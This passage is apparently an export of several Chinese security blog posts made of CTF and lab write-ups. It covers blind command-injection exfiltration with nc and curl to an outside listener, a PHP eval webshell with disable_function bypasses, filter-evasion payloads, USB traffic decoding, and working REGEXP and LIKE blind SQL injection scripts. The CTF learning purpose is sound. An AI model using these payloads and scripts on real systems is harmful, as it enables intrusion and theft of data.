3.公网服务器接收shell目标服务器上执行命令后，会在公网服务器上接收到，然后在公网服务器上执行以下命令getshell sessions -i 1 shell 然后cat flag.php得到flag。 7、使用nc 利用条件：要求目标服务器也有nc工具 #1.公网服务器监听4444端口 nc -tlp 4444 #2.目标服务器执行如下命令 ip=|nc -t x.x.x.165 4444 &lt; flag.php -u参数调整为udp,当tcp不能使用的时候使用 #1.公网服务器监听4444端口 nc -ulp 4444 #2.目标服务器执行如下命令 ip=|nc -u x.x.x.165 4444 &lt; flag.php 8、curl上传文件读取源码 利用条件：目标服务器curl命令可以正常执行 使用curl -F将flag文件上传到Burp的Collaborator Client(Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies) 1.获取Collaborator Client分配给Burp的链接 打开Burp主界面 -&gt; 菜单（Burp）-&gt; Collaboraor Client -&gt; 点击 Copy to Clipboard Copy得到 jyla6p5cfepdojez34stnodch3ntbi.burpcollaborator.net 2.拼接payload并在命令执行处提交 ip=|curl -X POST -F xx=@flag.php http://jyla6p5cfepdojez34stnodch3ntbi.burpcollaborator.net 3.查看Collaborator Client收到的数据成功得到flag。 写在后面学习过程中，发现参考资料个别地方存在一些小错误(估计是测试环境不同导致的)，并且有些地方不太完善。于是，自己通过测试和分析后，总结了这篇文章，希望能更好的学习无回显命令执行的利用。 参考博客：命令执行没有回显利用无回显代码执行利用方法命令执行无回显的判断方法及dnslog相关例题dnslog利用","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"命令注入","slug":"漏洞原理/命令注入","permalink":"https://qwzf.github.io/categories/漏洞原理/命令注入/"}],"tags":[{"name":"无回显命令执行","slug":"无回显命令执行","permalink":"https://qwzf.github.io/tags/无回显命令执行/"}],"author":"qwzf"},{"title":"命令执行绕过的练习(一)","slug":"命令执行绕过的练习(一)","date":"2020-08-12T08:43:32.391Z","updated":"2020-08-12T08:43:24.763Z","comments":true,"path":"2020/08/12/命令执行绕过的练习(一)/","link":"","permalink":"https://qwzf.github.io/2020/08/12/命令执行绕过的练习(一)/","excerpt":"","text":"0x00 前言总结完命令执行漏洞的相关绕过知识，做一下CTF题巩固一下，并总结一下做题过程。 0x01 GKCTF-Check_In考点：绕过disable_function题目源码： &lt;title&gt;Check_In&lt;/title&gt; &lt;?php highlight_file(__FILE__); class ClassName { public $code = null; public $decode = null; function __construct() { $this-&gt;code = @$this-&gt;x()[&#39;Ginkgo&#39;]; $this-&gt;decode = @base64_decode( $this-&gt;code ); @Eval($this-&gt;decode); } public function x() { return $_REQUEST; } } new ClassName(); 经测试发现可以连接上木马，但不能执行系统命令，从而无法执行根目录下的/readflag命令。 //eval($_POST[&#39;qwzf&#39;]); -&gt; ZXZhbCgkX1BPU1RbJ3F3emYnXSk7 蚁剑连接：?Ginkgo=ZXZhbCgkX1BPU1RbJ3F3emYnXSk7 然后查看phpinfo信息，发现disable_function禁用了命令执行函数。于是可以想到下面几种方式绕过disable_function1.利用ld_preload在phpinfo信息发现没有禁用mail函数，所以可以利用ld_preload绕过disable_function 在蚁剑里的/tmp目录下，传入之前文章提到的qwzf2.php和hack2.so //include(&#39;/tmp/qwzf2.php&#39;); -&gt; aW5jbHVkZSgnL3RtcC9xd3pmMi5waHAnKTs= ?Ginkgo=aW5jbHVkZSgnL3RtcC9xd3pmMi5waHAnKTs= POST：cmd=/readflag&amp;outpath=/tmp/test&amp;sopath=/tmp/hack2.so 2.利用php_gc因为php环境是php7.3，在PHP7.0~PHP7.3之间，所以也可以用php7-gc-bypass的POC打一下即可得到flag： //include(&#39;/tmp/exploit.php&#39;); -&gt; aW5jbHVkZSgnL3RtcC9leHBsb2l0LnBocCcpOw== ?Ginkgo=aW5jbHVkZSgnL3RtcC9leHBsb2l0LnBocCcpOw== //访问一下，即可得到flag 更多方法参考：bypass disable_function多种方法+实例 0x02 CTFhub技能树RCE-过滤cat考点：绕过文件内容读取(绕过cat)首先 ?ip=|ls 发现flag文件flag_4052237514444.php题目给出源码，发现过滤了cat。于是绕过cat ?ip=|more flag_4052237514444.php #more/less/head/tac/tail/nl/vi/vim/uniq/file -f/sort，以及od -c命令均可 然后查看源代码，得到flag 0x03 CTFhub技能树RCE-过滤空格考点：绕过空格首先 ?ip=|ls 发现flag文件flag_1304577872279.php题目给出源码，发现过滤了空格。于是绕过空格 ?ip=|cat${IFS}flag_1304577872279.php #$IFS$9/%09/&lt;/均可 然后查看源代码，得到flag 0x04 CTFhub技能树RCE-过滤目录分隔符考点：绕过目录分隔符/首先 ?ip=|ls 发现flag文件所在目录flag_is_here题目给出源码，发现过滤了目录分隔符/。于是绕过/有两种方法：方法一：使用linux的系统环境变量${PATH:0:1}代替/ ?ip=|ls flag_is_here${PATH:0:1} 得到flag文件flag_19492409018809.php ?ip=|cat flag_is_here${PATH:0:1}flag_19492409018809.php 查看源代码得到flag 方法二：利用;分隔符连续执行指令 ?ip=;cd flag_is_here;ls 得到flag文件flag_19492409018809.php ?ip=;cd flag_is_here;cat flag_19492409018809.php 查看源代码得到flag 0x05 CTFhub技能树RCE-过滤运算符考点：绕过运算符|和&amp;题目给出源码，发现过滤了运算符|和&amp;。于是直接利用;分隔符绕过 ?ip=;ls 得到flag文件flag_16845171801250.php ?ip=;cat flag_16845171801250.php 查看源代码得到flag 0x06 CTFhub技能树RCE-综合过滤练习考点：绕过运算符、;、空格、目录分隔符/、cat、flag和ctfhub关键字 &lt;?php $res = FALSE; if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) { $ip = $_GET[&#39;ip&#39;]; $m = []; if (!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/&quot;, $ip, $m)) { $cmd = &quot;ping -c 4 {$ip}&quot;; exec($cmd, $res); } else { $res = $m; } } ?&gt; 题目给出源码，发现过滤了运算符(|、&amp;)、;、空格、目录分隔符、cat、flag关键字和ctfhub关键字于是构造以下payload进行绕过： %0a绕过运算符和; $IFS$9代替空格 ${PATH:0:1}代替/ more代替cat 通配符代替flag ?ip=%0als #得到flag文件目录flag_is_here ?ip=%0als$IFS$9*_is_here${PATH:0:1} #得到flag文件flag_1832680587320.php ?ip=%0amore$IFS$9*_is_here${PATH:0:1}*_1832680587320.php #查看源代码得到flag 0x07 GXYCTF2019-Ping Ping Ping考点：绕过空格+绕过黑名单(也可内敛执行绕过) ?ip=|ls 得到flag.php和index.php。然后查看flag.php内容： ?ip=|cat flag.php 发现响应：/?ip= fxck your space!，于是绕过空格 ?ip=|cat${IFS}flag.php #发现响应：/?ip= 1fxck your symbol!，很明显不行 ?ip=|cat$IFS$9flag.php 发现响应：/?ip= fxck your flag!，应该是过滤了flag关键字，于是可以绕过黑名单或使用内敛执行绕过（1）方法一：绕过黑名单经测试可以使用拼接绕过 ?ip=;a=g;cat$IFS$9fla$a.php 然后查看源码，得到flag（2）方法二：内敛执行绕过 ?ip=|cat$IFS$9`ls` 0x08 后记学过命令执行的相关绕过后，再做这些题，发现竟如此容易。由此看来，技术知识和CTF题目是相辅相成的。继续努力吧！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"命令执行绕过","slug":"命令执行绕过","permalink":"https://qwzf.github.io/tags/命令执行绕过/"}],"author":"qwzf"},{"title":"CTF流量分析常见题型(二)-USB流量","slug":"CTF流量分析常见题型(二)-USB流量","date":"2020-08-01T14:33:53.440Z","updated":"2020-08-01T14:52:12.792Z","comments":true,"path":"2020/08/01/CTF流量分析常见题型(二)-USB流量/","link":"","permalink":"https://qwzf.github.io/2020/08/01/CTF流量分析常见题型(二)-USB流量/","excerpt":"","text":"0x00 前言在学习Wireshark常见使用时，对常见CTF流量分析题型和铁人三项流量分析题的部分问题进行了简单总结。由于篇幅过长，于是另起一篇总结USB流量包分析，包括键盘流量和鼠标流量。 0x01 USB流量包分析USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主。 1、键盘流量USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。其中键盘击键信息集中在第三个字节中。如图，发现击键信息为0x06，即对应的按键为C键位映射关系参考：《USB键盘协议中键码》中的HID Usage ID 1.题型：flag隐藏在usb流量中，通过USB协议数据中的键盘键码转换成键位。 2.解题思路：1.使用kali linux中的tshark 命令把cap data提取出来： tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt #提取并去除空行 2.根据《USB键盘协议中键码》中的HID Usage ID将数据还原成键位，可写一个Python脚本进行快速转换。 3.题目示例：【NSCTF】安全评测人员在对某银行卡密码输入系统进行渗透测试，截获了一段通过USB键盘输入6位数字密码的流量，其中也包含了一些其他无关的USB设备的流量，你能从中恢复出6位数字密码吗？最终提交的flag格式为flag提取码：q6ro（1）使用tshark 命令把pcap的数据提取并去除空行到usbdata.txt tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt （2）提取出来的数据可能会带冒号，也可能不带（有可能和wireshark的版本相关），但是一般的脚本都会按照有冒号的数据来识别 有冒号时提取数据的[6:8]无冒号时数据在[4:6] 可以用脚本来加上冒号 f=open(&#39;usbdata.txt&#39;,&#39;r&#39;) fi=open(&#39;out.txt&#39;,&#39;w&#39;) while 1: a=f.readline().strip() if a: if len(a)==16: # 鼠标流量的话len改为8 out=&#39;&#39; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+&quot;:&quot; else: out+=a[i]+a[i+1] fi.write(out) fi.write(&#39;\\n&#39;) else: break fi.close() 此时对应的第三字节，也就是[6:8]就代表了击键信息（3）提取出键盘流量后需要用脚本还原数据对应的信息。同时找到两个还原信息的脚本（python2）：keyboard1.py mappings = { 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;\\n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;, 0x34:&quot;&#39;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; } nums = [] keys = open(&#39;out.txt&#39;) for line in keys: if line[0]!=&#39;0&#39; or line[1]!=&#39;0&#39; or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39;: continue nums.append(int(line[6:8],16)) keys.close() output = &quot;&quot; for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += &#39;[unknown]&#39; print &#39;output :\\n&#39; + output keyboard2.py normalKeys = { &quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;, &quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;, &quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;, &quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;, &quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;, &quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;, &quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;} shiftKeys = { &quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;, &quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;{&quot;,&quot;30&quot;:&quot;}&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;, &quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;, &quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;, &quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;} output = [] keys = open(&#39;out.txt&#39;) for line in keys: try: if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;: continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;] else: output += [&#39;[unknown]&#39;] except: pass keys.close() flag=0 print(&quot;&quot;.join(output)) for i in range(len(output)): try: a=output.index(&#39;&lt;DEL&gt;&#39;) del output[a] del output[a-1] except: pass for i in range(len(output)): try: if output[i]==&quot;&lt;CAP&gt;&quot;: flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: pass print (&#39;output :&#39; + &quot;&quot;.join(output)) 运行第一个脚本得到 BCFGIJGFEDCABACFEDCA7200[DEL]53[DEL]93 因为[DEL]是删除键,恢复出6位数字。所以flag: 720593 2、鼠标流量USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节。 其中第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。 如图，数据信息为0x00002000，表示鼠标垂直向上移动20。 1.题型：flag隐藏在usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag。 2.解题思路：1.使用kali linux中的tshark 命令把cap data提取出来，并去除空行 tshark -r usb2.pcap -T fields -e usb.capdata &gt; usbdata.txt tshark -r usb2.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt #提取并去除空行 2.根据usb协议鼠标数据还原鼠标移动轨迹，可写一个Python脚本进行快速还原。 3.题目示例：【NSCTF】这是一道鼠标流量分析题。提取码：q6ro（1）使用tshark 命令把pcap的数据提取并去除空行到usbdata.txt tshark -r usb2.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt （2）使用上面提到过的加冒号的脚本，并将脚本里提到的16改为8，得到 python3 maohao.py （3）使用mouse.py测试信息隐藏位置 nums = [] keys = open(&#39;out.txt&#39;,&#39;r&#39;) f = open(&#39;xy.txt&#39;,&#39;w&#39;) posx = 0 posy = 0 for line in keys: if len(line) != 12 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x &gt; 127 : x -= 256 if y &gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing if btn_flag == 2 : # 1 代表左键 f.write(str(posx)) f.write(&#39; &#39;) f.write(str(posy)) f.write(&#39;\\n&#39;) f.close() 测试发现flag信息藏在右键中，即当脚本中btn_flag取2时可以得到一系列坐标（4）用gnuplot将xy.txt里的坐标转化成图像 gnuplot gnuplot&gt;plot &quot;xy.txt&quot; 发现方向反了，使用windows上的”画图”垂直翻转一下即可。最终得到flag 0x02 后记本次总结了USB流量包的流量分析，对键盘流量和鼠标流量有了简单的了解。 参考博客：USB流量知识点小结CTF流量分析之题型深度解析","categories":[{"name":"流量分析","slug":"流量分析","permalink":"https://qwzf.github.io/categories/流量分析/"}],"tags":[{"name":"流量分析","slug":"流量分析","permalink":"https://qwzf.github.io/tags/流量分析/"},{"name":"键盘流量","slug":"键盘流量","permalink":"https://qwzf.github.io/tags/键盘流量/"},{"name":"鼠标流量","slug":"鼠标流量","permalink":"https://qwzf.github.io/tags/鼠标流量/"}],"author":"qwzf"},{"title":"REGEXP注入与LIKE注入简单学习","slug":"REGEXP注入与LIKE注入简单学习","date":"2020-07-23T10:52:10.000Z","updated":"2020-08-01T17:28:39.374Z","comments":true,"path":"2020/07/23/REGEXP注入与LIKE注入简单学习/","link":"","permalink":"https://qwzf.github.io/2020/07/23/REGEXP注入与LIKE注入简单学习/","excerpt":"","text":"首发于先知社区 0x00 前言之前已经学过SQL盲注了，也见过盲注中REGEXP注入，但没详细了解过。正好这次BJD遇到了这个，简单总结，并把题目复现一下。 0x01 REGEXP注入分析注入原理REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。 1、基本注入select (select语句) regexp &#39;正则&#39; 正常的查询语句： select username from users where id=1; （1）正则注入，若匹配则返回1，不匹配返回0 select (select username from users where id=1) regexp &#39;^a&#39;; ^表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0（2）regexp关键字还可以代替where条件里的=号 select * from users where password regexp &#39;^ad&#39;; 使用场景： 过滤了=、in、like ^若被过滤，可使用$来从后往前进行匹配 常用regexp正则语句： regexp &#39;^[a-z]&#39; #判断一个表的第一个字符串是否在a-z中 regexp &#39;^r&#39; #判断第一个字符串是否为r regexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中 （3）在联合查询中的使用 1 union select 1,database() regexp &#39;^s&#39;,3--+ 2、REGEXP盲注在sqli-labs靶场Less-8关进行测试1.判断数据库长度 &#39; or (length(database())=8)--+ 正常 2.判断数据库名 &#39; or database() regexp &#39;^s&#39;--+ 正常 &#39; or database() regexp &#39;y$&#39;--+ 正常 表名、字段名、数据内容参考以前总结。很明显和普通的布尔盲注差不多，于是写个脚本： import requests import string strs = string.printable url = &quot;http://x.x.x.x:8001/Less-8/index.php?id=&quot; database1 = &quot;&#39; or database() regexp &#39;^{}&#39;--+&quot; table1 = &quot;&#39; or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#39;^{}&#39;--+&quot; cloumn1 = &quot;&#39; or (select column_name from information_schema.columns where table_name=\\&quot;users\\&quot; and table_schema=database() limit 1,1) regexp &#39;^{}&#39;--+&quot; data1 = &quot;&#39; or (select username from users limit 0,1) regexp &#39;^{}&#39;--+&quot; payload = database1 if __name__ == &quot;__main__&quot;: name = &#39;&#39; for i in range(1,40): char = &#39;&#39; for j in strs: payloads = payload.format(name+j) urls = url+payloads r = requests.get(urls) if &quot;You are in&quot; in r.text: name += j print(j,end=&#39;&#39;) char = j break if char ==&#39;#&#39;: break 0x02 LIKE注入分析like匹配百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。 1、基本注入1.like &#39;s%&#39;判断第一个字符是否为s 1 union select 1,database() like &#39;s%&#39;,3 --+ 2.like &#39;se%&#39;判断前面两个字符串是否为se 1 union select 1,database() like &#39;se%&#39;,3 --+ 3.like &#39;%sq%&#39; 判断是否包含se两个字符串 1 union select 1,database() like &#39;%se%&#39;,3 --+ 4.like &#39;_____&#39;判断是否为5个字符 1 union select 1,database() like &#39;_____&#39;,3 --+ 5.like &#39;s____&#39; 判断第一个字符是否为s 1 union select 1,database() like &#39;s____&#39;,3 --+ 2、LIKE盲注依旧在sqli-labs靶场Less-8关进行测试1.判断数据库长度可用length()函数，也可用_，如： &#39; or database() like &#39;________&#39;--+ 2.判断数据库名 &#39; or database() like &#39;s%&#39;--+ 也可用 &#39; or database() like &#39;s_______&#39;--+ 说明数据库名的第一个字符是s。数据表、字段、数据类似我又把REGEXP盲注脚本改一下，于是成了LIKE盲注脚本： import requests import string strs = string.printable url = &quot;http://x.x.x.x:8001/Less-8/index.php?id=&quot; database1 = &quot;&#39; or database() like &#39;{}%&#39;--+&quot; table1 = &quot;&#39; or (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#39;{}%&#39;--+&quot; cloumn1 = &quot;&#39; or (select column_name from information_schema.columns where table_name=\\&quot;users\\&quot; and table_schema=database() limit 1,1) like &#39;{}%&#39;--+&quot; data1 = &quot;&#39; or (select username from users limit 0,1) like &#39;{}%&#39;--+&quot; payload = database1 if __name__ == &quot;__main__&quot;: name = &#39;&#39; for i in range(1,40): char = &#39;&#39; for j in strs: payloads = payload.format(name+j) urls = url+payloads r = requests.get(urls) if &quot;You are in&quot; in r.text: name += j print(j,end=&#39;&#39;) char = j break if char ==&#39;#&#39;: break 爆出数据库名security 0x03 REGEXP注入实战学完REGEXP注入和LIKE注入后，是时候把BJD的简单注入那道题复现一下了。BJD CTF的简单注入主要涉及的是REGEXP盲注。开始复现：先fuzz一波，发现： 单引号 双引号都被ban了union和select都被ban了=和like被ban了 似乎没得思路了，看下wp，发现SQL语句逃逸单引号,于是了解一下这个方法。SQL语句逃逸单引号主要是通过反斜线\\，将单引号转义，从而实现了SQL语句逃逸，造成SQL注入。意思就是：假设sql语句为： select username,password from users where username=&#39;$user&#39; and password=&#39;$pwd&#39; 假设输入的用户名是admin\\，密码输入的是or 1#整个SQL语句变成了 select username,password from users where username=&#39;admin\\&#39; and password=&#39; or 1#&#39; 由于单引号被转义，and password=这部分都成了username的一部分，即 username=&#39;admin\\&#39; and password=&#39; 这样or 1就逃逸出来了，由此可控，可作为注入点。 而fuzz结果，确实发现反斜线没有被ban掉。于是就可以注入了然后发现这个地方会有变化。大师傅的wp上说用这个注不出登录密码，可以用REGEXP进行注入，并且还说要加上binary关键字区分大小写。好了，先不看大师傅的脚本，自己把上边的脚本改一下，试试。试过后发现跑不出来。。。。看下wp，发现要转换16进制(16进制在数据库执行查询时又默认转换成字符串)，好吧。再改写下，最终成品如下： import requests import string def str2hex(string): result = &#39;&#39; for i in string: result += hex(ord(i)) result = result.replace(&#39;0x&#39;,&#39;&#39;) return &#39;0x&#39;+result strs = string.ascii_letters+string.digits url = &quot;http://3fb55301-c0be-4134-830b-fda52f321221.node3.buuoj.cn/&quot; headers = { &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0&#39; } payload = &#39;or password regexp binary {}#&#39; if __name__ == &quot;__main__&quot;: name = &#39;&#39; for i in range(1,40): for j in strs: passwd = str2hex(&#39;^&#39;+name+j) payloads = payload.format(passwd) postdata={ &#39;username&#39;:&#39;admin\\\\&#39;, &#39;password&#39;:payloads } r = requests.post(url,data=postdata,headers=headers) if &quot;BJD need&quot; in r.text: name += j print(j,end=&#39;&#39;) break 跑出了用户密码登录即可得到flag。。。复现完毕。 0x04 后记学习了REGEXP注入和LIKE注入，了解了SQL语句逃逸单引号以及16进制在数据库执行继续努力！！ 参考博客：从CTF题中学习几种有趣(奇怪)的SQL注入CTF中几种通用的sql盲注手法和注入的一些tipssql注入之盲注攻击第二届BJDCTF 2020 全部WEB题目 